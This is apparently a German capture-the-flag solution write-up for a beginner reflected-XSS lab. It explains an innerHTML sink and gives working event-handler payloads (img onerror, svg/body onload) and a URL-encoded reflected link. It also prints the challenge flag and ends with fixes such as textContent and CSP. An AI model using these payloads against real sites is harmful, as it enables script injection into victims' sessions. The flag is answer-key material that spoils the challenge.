# 🔓 Lösung — XSS-01 Reflektierter Gruß

> ⚠️ **Spoiler.** Erst lesen, wenn du es selbst versucht hast. Es ist Stufe 1 —
> du schaffst das auch ohne diese Datei.

---

## Die Schwachstelle

Im `<script>` steht diese Funktion:

```js
function greet(name) {
  document.getElementById('output').innerHTML =
    'Hallo, ' + name + '! Schön, dass du da bist.';
}
```

Dein `name` wird per **`innerHTML`** in die Seite geschrieben. `innerHTML`
interpretiert den String als **HTML**, nicht als Text. Alles, was du eingibst, wird
also als echtes Markup geparst — inklusive Tags mit Event-Handlern.

## Warum `<script>` nicht funktioniert

```html
<script>showFlag()</script>
```

Das tut **nichts**. Der Browser führt `<script>`-Tags, die per `innerHTML`
nachträglich eingefügt werden, aus Sicherheitsgründen **nicht** aus. Anfänger
scheitern hier und denken, es sei nicht verwundbar. Ist es aber.

## Der Trick: ein Event-Handler, der von selbst feuert

Ein `<img>` mit kaputter `src` löst sofort seinen `onerror`-Handler aus — ganz ohne
Klick. Genau das nutzen wir, um die versteckte Funktion `showFlag()` aufzurufen.

### Payload (ins Namensfeld eingeben)

```html
<img src=x onerror=showFlag()>
```

→ Eintippen, **Begrüßen** klicken. Der grüne Kasten mit der Flag erscheint.

### Reiner XSS-Beweis (das klassische `alert`)

```html
<img src=x onerror=alert(document.domain)>
```

### Als URL-Parameter (echtes „reflected")

Roh:
```
index.html?name=<img src=x onerror=showFlag()>
```

URL-kodiert (so, wie man es in der Adressleiste/echt einsetzt):
```
index.html?name=%3Cimg%20src%3Dx%20onerror%3DshowFlag()%3E
```

Beim Laden liest die Seite `?name=` aus und ruft `greet()` direkt auf — die Payload
feuert **ohne jede Interaktion**. Genau so sieht ein echter Reflected-XSS-Link aus,
den ein Angreifer einem Opfer schickt.

### Alternative Payloads (funktionieren genauso)

```html
<svg onload=showFlag()>
<body onload=showFlag()>            <!-- je nach Kontext -->
<img src=x onerror="showFlag()">
```

---

## 🚩 Die Flag

```
TELQRR{r3fl3ct3d_xss_1st_d3r_3inst1eg}
```

Sie lag verschleiert im Script (base64 + rückwärts) und wird erst durch deinen
Aufruf von `showFlag()` entschlüsselt und angezeigt — reines „View Source" liefert
nur den kodierten Blob, nicht die Flag im Klartext.

---

## 🛡️ Wie man es richtig macht

Der Fix ist eine Zeile:

```js
// FALSCH — interpretiert HTML:
el.innerHTML = 'Hallo, ' + name + '!';

// RICHTIG — behandelt Eingabe als reinen Text:
el.textContent = 'Hallo, ' + name + '!';
```

Weitere Ebenen (Defense in Depth):

- **Kontext-korrektes Encoding** bei jeder Ausgabe (HTML, Attribut, JS, URL — je anders).
- **Content-Security-Policy** setzen, die Inline-Handler (`onerror=…`) blockt.
- Eingaben **serverseitig** validieren, nicht nur im Client.
- Framework-Auto-Escaping nutzen und nicht mit `dangerouslySetInnerHTML` / `v-html` umgehen.

---

## 📖 Was du hier gelernt hast

- `innerHTML` mit Nutzereingabe = XSS. `textContent` wäre sicher gewesen.
- `<script>` per `innerHTML` läuft nicht — **Event-Handler-Payloads** (`onerror`,
  `onload`) sind der Standardweg.
- „Reflected" heißt: Eingabe aus der URL landet direkt in der Seite → ein einziger Link
  genügt zum Angriff.
- Clientseitig ≠ harmlos: der Code läuft mit allen Rechten des Opfers auf der Seite.
